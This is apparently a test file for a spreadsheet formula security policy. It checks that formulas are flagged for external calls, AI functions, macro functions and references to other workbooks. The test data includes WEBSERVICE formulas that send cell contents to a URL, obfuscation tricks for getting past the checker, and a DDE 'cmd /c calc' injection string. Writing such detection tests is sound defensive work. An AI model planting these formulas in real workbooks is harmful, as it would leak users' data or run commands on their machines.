import { describe, expect, test } from 'vitest';
import { cellInputPolicyIssue, formulaPolicyIssue } from './policy';

describe('formulaPolicyIssue', () => {
	test.each([
		['=WEBSERVICE("https://example.test/?d="&A1)', 'external-function', 'WEBSERVICE'],
		// Bare references: a function passed as a value is called by MAP, LET or LAMBDA.
		['=MAP("ht"&"tp://127.0.0.1:9/?d="&A1,WEBSERVICE)', 'external-function', 'WEBSERVICE'],
		['=LET(f,WEBSERVICE,f("ht"&"tp://127.0.0.1:9/"))', 'external-function', 'WEBSERVICE'],
		['=LET(h,HYPERLINK,h("ht"&"tp://127.0.0.1:9/?"&A1,"Open"))', 'external-function', 'HYPERLINK'],
		['=BYROW(A1:A2,FILTERXML)', 'external-function', 'FILTERXML'],
		['=LAMBDA(x,WEBSERVICE(x))(A1)', 'external-function', 'WEBSERVICE'],
		// Namespaced storage forms and case.
		['=_xlfn._xlws.WEBSERVICE("ht"&"tp://127.0.0.1:9/")', 'external-function', 'WEBSERVICE'],
		['=_xlfn.webservice(A1)', 'external-function', 'WEBSERVICE'],
		['=MAP(A1:A3,_xlfn.IMAGE)', 'external-function', 'IMAGE'],
		['=-WEBSERVICE(A1)', 'external-function', 'WEBSERVICE'],
		['=@WEBSERVICE(A1)', 'external-function', 'WEBSERVICE'],
		['=STOCKHISTORY("MSFT",1)', 'external-function', 'STOCKHISTORY'],
		['=_xlfn._xlws.PY("x",0)', 'external-function', 'PY'],
		['=CUBEVALUE("conn","m")', 'external-function', 'CUBEVALUE'],
		['=RTD("server",,"topic")', 'external-function', 'RTD'],
		['=REGISTER.ID("lib","fn")', 'external-function', 'REGISTER.ID'],
		['=IMPORTXML(A1,"//a")', 'external-function', 'IMPORTXML'],
		['=COPILOT("summarize",A1:A9)', 'ai-function', 'COPILOT'],
		['=TRANSLATE(A1,"en","fr")', 'ai-function', 'TRANSLATE'],
		['=DETECTLANGUAGE(A1)', 'ai-function', 'DETECTLANGUAGE'],
		['=IF(A1>0,MAP(A1:A2,LAMBDA(x,COPILOT(x))),0)', 'ai-function', 'COPILOT'],
		// Text evaluated as a formula, and the macro functions a defined name can call.
		['=EVALUATE("WEB"&"SERVICE(A1)")', 'external-function', 'EVALUATE'],
		['=_xlfn.evaluate(A1)', 'external-function', 'EVALUATE'],
		['=LET(e,EVALUATE,e(A1))', 'external-function', 'EVALUATE'],
		['=EXEC("program")', 'external-function', 'EXEC'],
		['=FOPEN("data.txt")', 'external-function', 'FOPEN'],
		['=INITIATE("app","topic")', 'external-function', 'INITIATE'],
		// XLL add-in functions, called or passed by name, in any case or storage form.
		['=_xll.Fetch(A1)', 'external-function', '_xll.Fetch'],
		['=_XLL.Contoso.Lookup(A1)', 'external-function', '_XLL.Contoso.Lookup'],
		['=MAP(A1:A2,_xll.Fetch)', 'external-function', '_xll.Fetch'],
		['=_xlfn._xll.Fetch(1)', 'external-function', '_xlfn._xll.Fetch'],
	])('%s uses a restricted function', (formula, concern, name) => {
		expect(formulaPolicyIssue(formula)).toMatchObject({ concern, name });
	});

	test.each([
		'=[1]Sheet1!A1',
		"='[Book.xlsx]Sheet1'!A1",
		"='C:\\Reports\\[Q1.xlsx]Sheet1'!A1",
		"='\\\\server\\share\\[Q1.xlsx]Sheet1'!A1:B2",
		'=SUM([1]Sheet1:Sheet3!A1)',
		'=PERSONAL.XLSB!Macro()',
	])('%s refers to another workbook or a file', (formula) => {
		expect(formulaPolicyIssue(formula)?.concern).toBe('external-reference');
	});

	test.each(["=cmd|' /c calc'!A0", '=SUM(', '=A1 +* 2'])('%s cannot be checked', (formula) => {
		expect(formulaPolicyIssue(formula)?.concern).toBe('unreadable');
	});

	test.each([
		'=SUM(A1:A3)',
		'=IF(A1="http",1,0)',
		'="a|b"',
		'="WEBSERVICE(https://example.test)"',
		'=SUM(A1:A2)/2 & "www.x"',
		'=_xlfn.XLOOKUP(A1,B:B,C:C)',
		'=Table1[Amount]',
		'=[@Amount]*2',
		"=Sheet2!A1+'My Sheet'!B2",
		'=MAP(A1:A3,LAMBDA(x,x*2))',
		'=LET(rate,0.2,A1*rate)',
		'=MYIMAGE(A1)',
		'=Revenue*2',
		'="_xll.Fetch(A1)"&EVALUATE_RATE',
		'=INDIRECT("Sheet2!A"&B1)',
	])('%s is ordinary calculation', (formula) => {
		expect(formulaPolicyIssue(formula)).toBeNull();
	});
});

describe('cellInputPolicyIssue', () => {
	test('checks only what the grid stores as a formula', () => {
		expect(cellInputPolicyIssue('=WEBSERVICE(A1)')?.name).toBe('WEBSERVICE');
		for (const text of [
			'+WEBSERVICE("https://example.test")',
			' =WEBSERVICE(A1)',
			"'=WEBSERVICE(A1)",
			'plain text with WEBSERVICE( and | pipes',
			'42',
			'=',
		])
			expect(cellInputPolicyIssue(text), text).toBeNull();
	});
});
